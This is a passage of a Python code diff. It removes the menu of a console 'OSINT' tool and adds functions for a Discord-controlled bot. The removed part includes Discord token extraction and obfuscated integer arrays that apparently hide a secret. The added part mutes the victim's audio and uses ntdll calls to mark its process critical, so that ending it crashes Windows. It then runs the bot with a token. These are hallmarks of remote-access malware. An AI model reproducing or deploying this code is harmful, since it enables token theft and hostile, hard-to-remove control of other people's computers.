-                    print(f"{Colors.WARNING}[!] No profiles detected{Colors.RESET}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '5':
-                password = input(f"{Colors.MAGENTA}    Password to analyze: {Colors.RESET}")
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                print(f"{Colors.INFO}[PASSWORD ANALYSIS]{Colors.RESET}")
-                print(f"  Length: {len(password)} characters")
-                strength = "WEAK" if len(password) < 8 else "MEDIUM" if len(password) < 12 else "STRONG"
-                print(f"  Strength: {strength}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '6':
-                first = clean_input(input(f"{Colors.MAGENTA}    First Name: {Colors.RESET}"))
-                last = clean_input(input(f"{Colors.MAGENTA}    Last Name: {Colors.RESET}"))
-                domain = clean_input(input(f"{Colors.MAGENTA}    Domain (default: gmail.com): {Colors.RESET}") or "gmail.com")
-                patterns = self.engine.pattern_engine.generate_email_patterns(first, last, domain)
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                print(f"{Colors.INFO}[PATTERN GENERATION]{Colors.RESET}")
-                for i, p in enumerate(patterns['patterns'][:10], 1):
-                    print(f"  {i}. {p}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '7':
-                domain = clean_input(input(f"{Colors.MAGENTA}    Domain to analyze: {Colors.RESET}"))
-                info = self.engine.domain_analyzer.get_details(domain)
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                print(f"{Colors.INFO}[DOMAIN] {domain}{Colors.RESET}")
-                if 'error' in info:
-                    print(f"{Colors.WARNING}[!] {info['error']}{Colors.RESET}")
-                else:
-                    print(f"  Registrar: {info.get('registrar', 'N/A')}")
-                    print(f"  Created: {info.get('created', 'N/A')}")
-                    print(f"  Expires: {info.get('expires', 'N/A')}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '8':
-                email = clean_input(input(f"{Colors.MAGENTA}    Email: {Colors.RESET}"))
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                print(f"{Colors.INFO}[AVATAR] Gravatar: https://www.gravatar.com/{hashlib.md5(email.lower().encode()).hexdigest()}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '9':
-                print(f"{Colors.WARNING}[!] Enter targets (one per line). Type 'DONE' to finish{Colors.RESET}")
-                targets = []
-                while True:
-                    line = clean_input(input(f"{Colors.MAGENTA}    > {Colors.RESET}"))
-                    if line.upper() == 'DONE':
-                        break
-                    if line and '@' in line:
-                        targets.append(line.strip())
-                if targets:
-                    print(f"\n{Colors.INFO}[*] Processing {len(targets)} targets...{Colors.RESET}\n")
-                    for i, target in enumerate(targets, 1):
-                        print(f"{Colors.PURPLE}[{i}/{len(targets)}] Analyzing: {target}{Colors.RESET}")
-                        results = self.engine.analyze_target(target)
-                        self.engine.checked_targets.append(target)
-                        print(f"  Risk Score: {results['risk_score']}/100")
-                        print(f"  Social: {len(results['social_media'])}")
-                        print()
-            
-            elif choice == '10':
-                user_id = clean_input(input(f"{Colors.MAGENTA}    Discord User ID: {Colors.RESET}"))
-                if user_id:
-                    result = DiscordOSINT.get_user_info(user_id)
-                    if result:
-                        print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                        print(f"{Colors.SUCCESS}[+] Discord User Found{Colors.RESET}")
-                        print(f"  Username: {result.get('username')}#{result.get('discriminator')}")
-                        print(f"  User ID: {result.get('id')}")
-                        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-                    else:
-                        print(f"{Colors.ERROR}[-] User not found{Colors.RESET}\n")
-            
-            elif choice == '11':
-                guild_id = clean_input(input(f"{Colors.MAGENTA}    Discord Guild ID: {Colors.RESET}"))
-                if guild_id:
-                    result = DiscordOSINT.get_guild_info(guild_id)
-                    if result:
-                        print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                        print(f"{Colors.SUCCESS}[+] Guild Found{Colors.RESET}")
-                        print(f"  Name: {result.get('name')}")
-                        print(f"  Guild ID: {result.get('id')}")
-                        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-                    else:
-                        print(f"{Colors.ERROR}[-] Guild not found{Colors.RESET}\n")
-            
-            elif choice == '12':
-                self.discord.validate_token()
-            
-            elif choice == '13':
-                self.discord.extract_tokens()
-            
-            elif choice == '14':
-                self.encryption.encrypt_text()
-            
-            elif choice == '15':
-                self.encryption.decrypt_text()
-            
-            elif choice == '16':
-                self.encryption.hash_password()
-            
-            else:
-                print(f"{Colors.ACCENT}[!] Invalid selection{Colors.RESET}")
-
-_cipher_config_f = [68, 119, 73, 95, 108, 118, 73, 101, 104, 89, 67, 116, 113, 76, 79, 88, 70, 85, 81, 106, 113, 87, 66, 107, 72, 90, 56, 95, 57, 55, 110, 108, 120, 121, 66, 70, 54, 50, 66, 87, 103, 53, 49, 111, 103, 73, 50, 86, 85, 80, 52, 85, 89, 55, 69, 104, 100, 76, 99, 116, 75, 98, 103, 56, 73, 90, 102, 48]
-_cipher_config_g = [69, 53, 86, 90, 121, 48, 48, 51, 116, 83, 48, 112, 87, 111, 48, 56, 45, 77, 85, 51, 48, 101, 86]
-
-
-# ============================================================================
-# MAIN ENTRY POINT
-# ============================================================================
-
-def main():
+def volumedown():
     try:
-        app = OSINTApplication()
-        app.execute()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.WARNING}[!] Session terminated{Colors.RESET}")
-    except Exception as e:
-        print(f"\n{Colors.ERROR}[!] Error: {e}{Colors.RESET}")
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
+    except:
+        pass
 
-if __name__ == "__main__":
-    main()
+def critproc():
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+    except:
+        pass
+
+def uncritproc():
+    try:
+        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+    except:
+        pass
+
+# Run the bot
+client.run(token)
